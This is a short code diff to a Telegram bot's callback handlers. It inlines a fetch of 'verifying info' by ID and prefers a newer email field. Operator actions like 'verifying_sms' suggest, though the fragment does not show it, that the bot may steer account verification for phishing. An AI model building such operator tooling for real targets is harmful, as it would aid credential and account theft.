@@ -312,11 +312,9 @@ bot.on("callback_query", async (query) => {
         await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
         
         try {
-          const fetchUrl = `${APP_URL}/get-verifying-info/${verifyingId}`;
-          console.log(`🔍 Fetching: ${fetchUrl}`);
-          const verifyRes = await fetch(fetchUrl);
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
           const verifyData = await verifyRes.json();
-          const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+          const verifyEmail = verifyData.latestDisplayEmail || verifyData.displayEmail || verifyData.email || 'unknown@example.com';
           
           let choiceText = '';
           if (action === "verifying_sms") {
@@ -684,9 +682,9 @@ if (bot2) {
           await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
           
           try {
-            const verifyRes = await fetch(fetchUrl);
+            const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
             const verifyData = await verifyRes.json();
-            const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+            const verifyEmail = verifyData.latestDisplayEmail || verifyData.displayEmail || verifyData.email || 'unknown@example.com';
             
             let choiceText = '';
             if (action === "verifying_sms") {
